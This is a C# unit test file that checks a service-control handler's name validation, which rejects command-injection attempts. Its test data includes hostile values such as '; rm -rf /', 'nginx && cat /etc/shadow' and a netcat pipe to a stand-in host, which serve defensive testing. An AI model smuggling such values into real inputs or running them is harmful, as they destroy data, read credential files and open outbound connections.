using FluentAssertions;
using HomeManagement.Agent.Handlers;
using HomeManagement.Agent.Protocol;
using Microsoft.Extensions.Logging.Abstractions;

namespace HomeManagement.Agent.Tests.Handlers;

/// <summary>
/// Tests for <see cref="ServiceCommandHandler"/> input validation.
/// Verifies the security fix (NEW-02): strict service name regex
/// prevents command injection via service name field.
/// </summary>
public sealed class ServiceCommandHandlerTests
{
    private static readonly ServiceCommandHandler Handler =
        new(NullLogger<ServiceCommandHandler>.Instance);

    private static CommandRequest MakeRequest(string serviceName, string action = "status") =>
        new()
        {
            RequestId = Guid.NewGuid().ToString(),
            CommandType = "ServiceControl",
            ParametersJson = System.Text.Json.JsonSerializer.Serialize(
                new { ServiceName = serviceName, Action = action }),
            ElevationMode = "None"
        };

    // ── Valid service names ──

    [Theory]
    [InlineData("nginx")]
    [InlineData("sshd")]
    [InlineData("docker.service")]
    [InlineData("my-app")]
    [InlineData("my_app")]
    [InlineData("W32Time")]
    [InlineData("windows.update")]
    public async Task HandleAsync_ValidServiceName_DoesNotRejectInput(string serviceName)
    {
        // These will fail at process launch (no systemctl/sc.exe in test),
        // but they should NOT be rejected by input validation.
        var request = MakeRequest(serviceName);
        try
        {
            await Handler.HandleAsync(request, CancellationToken.None);
        }
        catch (System.ComponentModel.Win32Exception)
        {
            // Expected — process not found on test machine
        }
        catch (Exception ex) when (ex.Message.Contains("No such file"))
        {
            // Expected on Windows when calling systemctl
        }

        // If we got here without an "Invalid service name" rejection, the test passes
    }

    // ── Invalid service names (injection attempts) ──

    [Theory]
    [InlineData("; rm -rf /")]
    [InlineData("nginx && cat /etc/shadow")]
    [InlineData("svc$(whoami)")]
    [InlineData("svc`id`")]
    [InlineData("name with spaces")]
    [InlineData("svc|nc evil 1234")]
    [InlineData("svc>file")]
    [InlineData("")]
    public async Task HandleAsync_InvalidServiceName_RejectsWithAuthorizationError(string serviceName)
    {
        var request = MakeRequest(serviceName);
        var response = await Handler.HandleAsync(request, CancellationToken.None);

        response.ExitCode.Should().Be(-1);
        response.ErrorCategory.Should().Be("Authorization");
        response.Stderr.Should().Contain("Invalid service name");
    }

    // ── CommandType ──

    [Fact]
    public void CommandType_ReturnsServiceControl()
    {
        Handler.CommandType.Should().Be("ServiceControl");
    }
}
